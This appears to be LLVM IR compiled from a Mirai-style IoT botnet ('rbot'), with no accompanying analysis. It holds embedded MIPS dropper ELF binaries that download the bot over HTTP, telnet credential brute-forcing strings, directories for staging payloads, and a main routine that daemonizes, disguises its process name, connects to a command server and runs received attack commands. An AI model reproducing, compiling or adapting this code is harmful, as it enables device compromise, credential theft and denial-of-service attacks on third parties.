\00\08\00\00\00\00\00\00\00\00<\1C\00\05'\9C\80\A0\03\99\E0!'\BD\FF\E0\AF\BF\00\1C\AF\B0\00\18\AF\BC\00\10\8F\99\804\00\00\00\00\03 \F8\09\00\80\80!\8F\BC\00\10\ACP\00\00\8F\BF\00\1C\8F\B0\00\18$\02\FF\FF\03\E0\00\08'\BD\00 \00\00\00\00\00\00\00\00<\1C\00\05'\9C\80P\03\99\E0!\8F\82\800\03\E0\00\08\00\00\00\00\00\00\00\00\00\00\00\00mips\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.mips HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00D\06 \00@\05`\00@\01\9C\00@\02\10\00@\05\10\00@\01(\00@\01t\00@\00\A0\00@\01\C4\00@\00\C8\00@\00\E4\00@\04\A0\00@\01\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00@\00\A0\00\00\00\A0\00\00\04\E0\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00@\05\80\00\00\05\80\00\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\10\00\00\03\00D\05\C0\00\00\05\C0\00\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00D\06 \00\00\06\14\00\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\06\14\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\06\14\00\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@.str.19 = private unnamed_addr constant [1921 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00\08\00\01\00\00\00\84\04@\004\00\00\00h\06\00\00\07\10\00\004\00 \00\03\00(\00\07\00\06\00\01\00\00\00\00\00\00\00\00\00@\00\00\00@\00\D4\05\00\00\D4\05\00\00\05\00\00\00\00\00\01\00\01\00\00\00\E0\05\00\00\E0\05D\00\E0\05D\00T\00\00\00p\00\00\00\06\00\00\00\00\00\01\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\FF\00\A50\00,\05\00\00&\04\00% \85\00\FF\00\E70\FF\00\C60% \87\00\002\06\00%0\C4\00\02\22\06\00\00\FF\C30\00\1A\03\00\00\FF\840\00\16\06\00\026\06\00%\10C\00%0\C4\00\08\00\E0\03%\10F\00\05\00\1C<\E4\84\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A1\0F\04$\05\00\1C<\C8\84\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A6\0F\04$\05\00\1C<\AC\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A5\0F\04$\05\00\1C<\84\84\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\03\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<8\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A4\0F\04$\05\00\1C<\10\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A3\0F\04$\05\00\1C<\E8\83\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\01\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<\9C\83\9C'!\E0\99\03@\FF\BD'\BC\00\BF\AF\B8\00\B2\AF\B4\00\B1\AF\B0\00\B0\AF\10\00\BC\AF\18\80\82\8F\00\00\00\00\A0\05P$\00\00\02\82\00\00\00\00\FD\FF@\14\01\00\10&\FF\FF\10&\02\00\02$\1C\00\A2\A7\00P\02$\1E\00\A2\A7\18\80\82\8FL\80\99\8F\D0\00\07$\B0\00\04$k\00\05$\85\00\06$\A0\05B$\09\F8 \03#\80\02\02\10\00\BC\8F\01\03\05$\18\80\84\8F`\80\99\8F\A8\05\84$\FF\01\06$\09\F8 \03 \00\A2\AF\10\00\BC\8F\02\00\04$P\80\99\8F\02\00\05$!0\00\00\09\F8 \03!\90@\00!\88@\00\FF\FF\02$\10\00\BC\8F\03\00\22\12\00\00\00\00\07\00B\16\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\01\00\04$\10\00\BC\8F\00\00\00\00D\80\99\8F!  \02\1C\00\A5'\09\F8 \03\10\00\06$\10\00\BC\8F\07\00A\04\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03# \02\00\10\00\BC\8F\00\00\00\00\18\80\85\8FH\80\99\8F\17\00\10&\B8\05\A5$!  \02\09\F8 \03!0\00\02\10\00\BC\8F\07\00P\10!\80\00\00T\80\99\8F\00\00\00\00\09\F8 \03\03\00\04$\10\00\BC\8F!\80\00\008\80\99\8F!  \02\18\00\A5'\09\F8 \03\01\00\06$\10\00\BC\8F\01\00\03$T\80\99\8F\04\00C\10\04\00\04$\09\F8 \03\00\00\00\00\10\00\BC\8F\18\00\A3\83\00\12\10\00%\80C\00\0A\0D\02<\0A\0DB4\ED\FF\02\16\00\00\00\008\80\99\8F,\00\B0'!  \02!(\00\02\09\F8 \03\80\00\06$\10\00\BC\8F!(\00\02H\80\99\8F!0@\00\06\00@\18! @\02\09\F8 \03\00\00\00\00\10\00\BC\8F\F0\FF\00\10\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03!  \02\10\00\BC\8F\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03! @\02\10\00\BC\8F\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\05\00\04$\10\00\BC\8F\BC\00\BF\8F\B8\00\B2\8F\B4\00\B1\8F\B0\00\B0\8F\08\00\E0\03\C0\00\BD'\05\00\1C<L\81\9C'!\E0\99\03!\00\E0\03\01\00\11\04\00\00\00\00\05\00\1C<4\81\9C'!\E0\9F\03!\F8\00\00<\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\10\81\9C'!\E0\99\03!\10\80\00! \A0\00!(\C0\00!0\E0\00\10\00\A7\8F\14\00\A8\8F\18\00\A9\8F\1C\00\AA\8F\E0\FF\BD'\10\00\A8\AF\14\00\A9\AF\18\00\AA\AF\1C\00\A2\AF\1C\00\A2\8F\0C\00\00\00\03\00\E0\14 \00\BD'\08\00\E0\03\00\00\00\00! @\00@\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\A0\80\9C'!\E0\99\03\E0\FF\BD'\1C\00\BF\AF\18\00\B0\AF\10\00\BC\AF4\80\99\8F\00\00\00\00\09\F8 \03!\80\80\00\10\00\BC\8F\00\00P\AC\1C\00\BF\8F\18\00\B0\8F\FF\FF\02$\08\00\E0\03 \00\BD'\00\00\00\00\00\00\00\00\05\00\1C<P\80\9C'!\E0\99\030\80\82\8F\08\00\E0\03\00\00\00\00\00\00\00\00\00\00\00\00mpsl\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.mpsl HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00@\06D\00\80\05@\00\C0\01@\004\02@\000\05@\00L\01@\00\98\01@\00\A0\00@\00\E8\01@\00\EC\00@\00\08\01@\00\C0\04@\00$\01@\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\A0\00@\00\A0\00\00\00\00\05\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\A0\05@\00\A0\05\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\00\00\00\03\00\00\10\E0\05D\00\E0\05\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00\00\00@\06D\004\06\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\004\06\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\004\06\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.148 = private unnamed_addr constant [11 x i8] c"sage: wget\00", align 1
@.str.149 = private unnamed_addr constant [11 x i8] c"sage: tftp\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.1.5 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.2.6 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.3.7 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.4.8 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"/bin/\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"/etc/\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"/var/Sofia\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.128 = private unnamed_addr constant [9 x i8] c"FINISHED\00", align 1
@.str.129 = private unnamed_addr constant [7 x i8] c"BRUTED\00", align 1
@.str.127 = private unnamed_addr constant [68 x i8] c"[%d.%d.%d.%d:23] [%s:%s] [%s] [Status:%s] [Method:%d] [Attempt #%d]\00", align 1
@.str.136 = private unnamed_addr constant [6 x i8] c"ARMv7\00", align 1
@.str.137 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.138 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"\7FELF\00", align 1
@.str.133 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.134 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.135 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.139 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.140 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.141 = private unnamed_addr constant [10 x i8] c"ncomplete\00", align 1
@.str.142 = private unnamed_addr constant [15 x i8] c"attempt failed\00", align 1
@.str.143 = private unnamed_addr constant [6 x i8] c"% Bad\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.144 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.145 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.146 = private unnamed_addr constant [4 x i8] c"ser\00", align 1
@.str.147 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = local_unnamed_addr global i16 0, align 2
@auth_table_len = local_unnamed_addr global i32 0, align 4
@auth_table = local_unnamed_addr global %struct.scanner_auth* null, align 8

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture readonly) local_unnamed_addr #0 {
  %3 = alloca [32 x i8], align 16
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %7 to %struct.timeval*
  %8 = alloca i16, align 2
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca [1024 x i8], align 16
  %16 = load i8*, i8** %1, align 8
  %17 = tail call i32 @unlink(i8* %16) #9
  %18 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %4) #9
  %19 = call i32 @sigaddset(%struct.__sigset_t* nonnull %4, i32 2) #9
  %20 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null) #9
  %21 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %22 = call void (i32)* @signal(i32 1, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %23 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0)) #9
  call void @table_init() #9
  call fastcc void @ensure_single_instance()
  call void @rand_init() #9
  %24 = getelementptr inbounds [32 x i8], [32 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 32, i32 16, i1 false)
  %25 = icmp eq i32 %0, 2
  br i1 %25, label %26, label %37

; <label>:26:                                     ; preds = %2
  %27 = getelementptr inbounds i8*, i8** %1, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @util_strlen(i8* %28) #9
  %30 = icmp slt i32 %29, 32
  br i1 %30, label %31, label %37

; <label>:31:                                     ; preds = %26
  %32 = load i8*, i8** %27, align 8
  %33 = call i32 @util_strcpy(i8* nonnull %24, i8* %32) #9
  %34 = load i8*, i8** %27, align 8
  %35 = call i32 @util_strlen(i8* %34) #9
  %36 = sext i32 %35 to i64
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 %36, i32 1, i1 false)
  br label %39

; <label>:37:                                     ; preds = %26, %2
  %38 = call i32 @util_strcpy(i8* nonnull %24, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i64 0, i64 0)) #9
  br label %39

; <label>:39:                                     ; preds = %37, %31
  %40 = load i8*, i8** %1, align 8
  %41 = call i32 @util_strcpy(i8* %40, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0)) #9
  %42 = call i32 (i32, ...) @prctl(i32 15, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0)) #9
  %43 = call i32 @fork() #9
  store i32 %43, i32* @pid1, align 4
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %46, label %45

; <label>:45:                                     ; preds = %39
  call void @exit(i32 1) #10
  unreachable

; <label>:46:                                     ; preds = %39
  %47 = call i32 @fork() #9
  store i32 %47, i32* @pid2, align 4
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %46
  call void @exit(i32 1) #10
  unreachable

; <label>:50:                                     ; preds = %46
  %51 = call i32 @setsid() #9
  %52 = call i32 @close(i32 0) #9
  %53 = call i32 @close(i32 1) #9
  %54 = call i32 @close(i32 2) #9
  %55 = call signext i8 @attack_init() #9
  call void @scanner_init() #9
  %56 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %57 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %58 = bitcast i16* %14 to i8*
  %59 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i64 0, i64 0
  %60 = bitcast i32* %11 to i8*
  %61 = bitcast i16* %8 to i8*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %50
  %.020 = phi i32 [ 0, %50 ], [ %.020.be, %.backedge.backedge ]
  %62 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %56) #9, !srcloc !1
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %57) #9, !srcloc !2
  %64 = load i32, i32* @fd_ctrl, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %75, label %66

; <label>:66:                                     ; preds = %.backedge
  %67 = srem i32 %64, 64
  %68 = zext i32 %67 to i64
  %69 = shl i64 1, %68
  %70 = sdiv i32 %64, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %69
  store i64 %74, i64* %72, align 8
  br label %75

; <label>:75:                                     ; preds = %.backedge, %66
  %76 = load i32, i32* @fd_serv, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %75
  call fastcc void @establish_connection()
  %.pre = load i32, i32* @fd_serv, align 4
  %.pre24 = load i32, i32* @fd_ctrl, align 4
  br label %79

; <label>:79:                                     ; preds = %78, %75
  %80 = phi i32 [ %.pre24, %78 ], [ %64, %75 ]
  %81 = phi i32 [ %.pre, %78 ], [ %76, %75 ]
  %82 = load i8, i8* @pending_connection, align 1
  %83 = icmp ne i8 %82, 0
  %84 = srem i32 %81, 64
  %85 = zext i32 %84 to i64
  %86 = shl i64 1, %85
  %.sink = select i1 %83, %struct.__sigset_t* %6, %struct.__sigset_t* %5
  %87 = sdiv i32 %81, 64
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %.sink, i64 0, i32 0, i64 %88
  %90 = load i64, i64* %89, align 8
  %91 = or i64 %86, %90
  store i64 %91, i64* %89, align 8
  %92 = icmp sgt i32 %80, %81
  %. = select i1 %92, i32 %80, i32 %81
  store <2 x i64> <i64 10, i64 0>, <2 x i64>* %7, align 16
  %93 = add nsw i32 %., 1
  %94 = call i32 @select(i32 %93, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %tmpcast) #9
  switch i32 %94, label %102 [
    i32 -1, label %.backedge.backedge
    i32 0, label %95
  ]

; <label>:95:                                     ; preds = %79
  store i16 0, i16* %8, align 2
  %96 = add nsw i32 %.020, 1
  %97 = srem i32 %.020, 6
  %98 = icmp eq i32 %97, 0
  br i1 %98, label %99, label %102

; <label>:99:                                     ; preds = %95
  %100 = load i32, i32* @fd_serv, align 4
  %101 = call i64 @send(i32 %100, i8* nonnull %61, i64 2, i32 16384) #9
  br label %102

; <label>:102:                                    ; preds = %79, %99, %95
  %.121 = phi i32 [ %96, %99 ], [ %96, %95 ], [ %.020, %79 ]
  %103 = load i32, i32* @fd_ctrl, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %122, label %105

; <label>:105:                                    ; preds = %102
  %106 = sdiv i32 %103, 64
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %107
  %109 = load i64, i64* %108, align 8
  %110 = srem i32 %103, 64
  %111 = zext i32 %110 to i64
  %112 = shl i64 1, %111
  %113 = and i64 %109, %112
  %114 = icmp eq i64 %113, 0
  br i1 %114, label %122, label %115

; <label>:115:                                    ; preds = %105
  store i32 16, i32* %10, align 4
  %116 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %117 = call i32 @accept(i32 %103, %struct.sockaddr* nonnull %116, i32* nonnull %10) #9
  call void @scanner_kill()
  %118 = load i32, i32* @maintain_thread, align 4
  %119 = call i32 @kill(i32 %118, i32 9) #9
  call void @attack_kill_all() #9
  %120 = sub nsw i32 0, %51
  %121 = call i32 @kill(i32 %120, i32 9) #9
  call void @exit(i32 0) #10
  unreachable

; <label>:122:                                    ; preds = %105, %102
  %123 = load i8, i8* @pending_connection, align 1
  %124 = icmp eq i8 %123, 0
  br i1 %124, label %162, label %125

; <label>:125:                                    ; preds = %122
  store i8 0, i8* @pending_connection, align 1
  %126 = load i32, i32* @fd_serv, align 4
  %127 = sdiv i32 %126, 64
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %128
  %130 = load i64, i64* %129, align 8
  %131 = srem i32 %126, 64
  %132 = zext i32 %131 to i64
  %133 = shl i64 1, %132
  %134 = and i64 %133, %130
  %135 = icmp eq i64 %134, 0
  br i1 %135, label %136, label %137

; <label>:136:                                    ; preds = %125
  call fastcc void @teardown_connection()
  br label %.backedge.backedge

; <label>:137:                                    ; preds = %125
  store i32 0, i32* %11, align 4
  store i32 4, i32* %12, align 4
  %138 = call i32 @getsockopt(i32 %126, i32 1, i32 4, i8* nonnull %60, i32* nonnull %12) #9
  %139 = load i32, i32* %11, align 4
  %140 = icmp eq i32 %139, 0
  br i1 %140, label %148, label %141

; <label>:141:                                    ; preds = %137
  %142 = load i32, i32* @fd_serv, align 4
  %143 = call i32 @close(i32 %142) #9
  store i32 -1, i32* @fd_serv, align 4
  %144 = call i32 @rand_next() #9
  %145 = urem i32 %144, 10
  %146 = add nuw nsw i32 %145, 1
  %147 = call i32 @sleep(i32 %146) #9
  br label %.backedge.backedge

; <label>:148:                                    ; preds = %137
  %149 = call i32 @util_strlen(i8* nonnull %24) #9
  %150 = trunc i32 %149 to i8
  store i8 %150, i8* %13, align 1
  %151 = call i32 @util_local_addr() #9
  store i32 %151, i32* @LOCAL_ADDR, align 4
  %152 = load i32, i32* @fd_serv, align 4
  %153 = call i64 @send(i32 %152, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i64 4, i32 16384) #9
  %154 = load i32, i32* @fd_serv, align 4
  %155 = call i64 @send(i32 %154, i8* nonnull %13, i64 1, i32 16384) #9
  %156 = load i8, i8* %13, align 1
  %157 = icmp eq i8 %156, 0
  br i1 %157, label %.backedge.backedge, label %158

; <label>:158:                                    ; preds = %148
  %159 = load i32, i32* @fd_serv, align 4
  %160 = zext i8 %156 to i64
  %161 = call i64 @send(i32 %159, i8* nonnull %24, i64 %160, i32 16384) #9
  br label %.backedge.backedge

; <label>:162:                                    ; preds = %122
  %163 = load i32, i32* @fd_serv, align 4
  %164 = icmp eq i32 %163, -1
  br i1 %164, label %.backedge.backedge, label %165

; <label>:165:                                    ; preds = %162
  %166 = sdiv i32 %163, 64
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %167
  %169 = load i64, i64* %168, align 8
  %170 = srem i32 %163, 64
  %171 = zext i32 %170 to i64
  %172 = shl i64 1, %171
  %173 = and i64 %169, %172
  %174 = icmp eq i64 %173, 0
  br i1 %174, label %.backedge.backedge, label %175

; <label>:175:                                    ; preds = %165
  %176 = tail call i32* @__errno_location() #11
  store i32 0, i32* %176, align 4
  %177 = load i32, i32* @fd_serv, align 4
  %178 = call i64 @recv(i32 %177, i8* nonnull %58, i64 2, i32 16386) #9
  %179 = trunc i64 %178 to i32
  switch i32 %179, label %182 [
    i32 -1, label %180
    i32 0, label %.thread
  ]

; <label>:180:                                    ; preds = %175
  %181 = load i32, i32* %176, align 4
  switch i32 %181, label %.thread [
    i32 11, label %.backedge.backedge
    i32 4, label %.backedge.backedge
  ]

.thread:                                          ; preds = %175, %180
  call fastcc void @teardown_connection()
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %.thread, %185, %.thread23, %212, %136, %158, %141, %162, %165, %202, %148, %79, %180, %180, %200, %200
  %.020.be = phi i32 [ %.020, %79 ], [ %.121, %141 ], [ %.121, %158 ], [ %.121, %148 ], [ %.121, %136 ], [ %.121, %180 ], [ %.121, %.thread ], [ %.121, %185 ], [ %.121, %200 ], [ %.121, %.thread23 ], [ %.121, %212 ], [ %.121, %202 ], [ %.121, %165 ], [ %.121, %162 ], [ %.121, %180 ], [ %.121, %200 ]
  br label %.backedge

; <label>:182:                                    ; preds = %175
  %183 = load i16, i16* %14, align 2
  %184 = icmp eq i16 %183, 0
  br i1 %184, label %185, label %188

; <label>:185:                                    ; preds = %182
  %186 = load i32, i32* @fd_serv, align 4
  %187 = call i64 @recv(i32 %186, i8* nonnull %58, i64 2, i32 16384) #9
  br label %.backedge.backedge

; <label>:188:                                    ; preds = %182
  %189 = call zeroext i16 @ntohs(i16 zeroext %183) #11
  store i16 %189, i16* %14, align 2
  %190 = icmp ugt i16 %189, 1024
  br i1 %190, label %191, label %194

; <label>:191:                                    ; preds = %188
  %192 = load i32, i32* @fd_serv, align 4
  %193 = call i32 @close(i32 %192) #9
  store i32 -1, i32* @fd_serv, align 4
  %.pre25 = load i16, i16* %14, align 2
  br label %194

; <label>:194:                                    ; preds = %191, %188
  %195 = phi i16 [ %.pre25, %191 ], [ %189, %188 ]
  store i32 0, i32* %176, align 4
  %196 = load i32, i32* @fd_serv, align 4
  %197 = zext i16 %195 to i64
  %198 = call i64 @recv(i32 %196, i8* nonnull %59, i64 %197, i32 16386) #9
  %199 = trunc i64 %198 to i32
  switch i32 %199, label %202 [
    i32 -1, label %200
    i32 0, label %.thread23
  ]

; <label>:200:                                    ; preds = %194
  %201 = load i32, i32* %176, align 4
  switch i32 %201, label %.thread23 [
    i32 11, label %.backedge.backedge
    i32 4, label %.backedge.backedge
  ]

.thread23:                                        ; preds = %194, %200
  call fastcc void @teardown_connection()
  br label %.backedge.backedge

; <label>:202:                                    ; preds = %194
  %203 = load i32, i32* @fd_serv, align 4
  %204 = call i64 @recv(i32 %203, i8* nonnull %58, i64 2, i32 16384) #9
  %205 = load i16, i16* %14, align 2
  %206 = call zeroext i16 @ntohs(i16 zeroext %205) #11
  store i16 %206, i16* %14, align 2
  %207 = load i32, i32* @fd_serv, align 4
  %208 = zext i16 %206 to i64
  %209 = call i64 @recv(i32 %207, i8* nonnull %59, i64 %208, i32 16384) #9
  %210 = load i16, i16* %14, align 2
  %211 = icmp eq i16 %210, 0
  br i1 %211, label %.backedge.backedge, label %212

; <label>:212:                                    ; preds = %202
  %213 = zext i16 %210 to i32
  call void @attack_parse(i8* nonnull %59, i32 %213) #9
  br label %.backedge.backedge
}

; Function Attrs: nounwind
declare i32 @unlink(i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #1

declare void @table_init() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @ensure_single_instance() unnamed_addr #3 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca i32, align 4
  store i32 1, i32* %2, align 4
  %3 = tail call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %3, i32* @fd_ctrl, align 4
  %4 = icmp eq i32 %3, -1
  br i1 %4, label %42, label %5

; <label>:5:                                      ; preds = %0
  %6 = bitcast i32* %2 to i8*
  %7 = call i32 @setsockopt(i32 %3, i32 1, i32 2, i8* nonnull %6, i32 4) #9
  %8 = load i32, i32* @fd_ctrl, align 4
  %9 = call i32 (i32, i32, ...) @fcntl(i32 %8, i32 3, i32 0) #9
  %10 = or i32 %9, 2048
  %11 = call i32 (i32, i32, ...) @fcntl(i32 %8, i32 4, i32 %10) #9
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %.b2 = load i1, i1* @ensure_single_instance.local_bind, align 1
  br i1 %.b2, label %15, label %13

; <label>:13:                                     ; preds = %5
  %14 = call i32 @htonl(i32 2130706433) #11
  br label %17

; <label>:15:                                     ; preds = %5
  %16 = load i32, i32* @LOCAL_ADDR, align 4
  br label %17

; <label>:17:                                     ; preds = %15, %13
  %18 = phi i32 [ %14, %13 ], [ %16, %15 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %18, i32* %19, align 4
  %20 = call zeroext i16 @htons(i16 zeroext -14435) #11
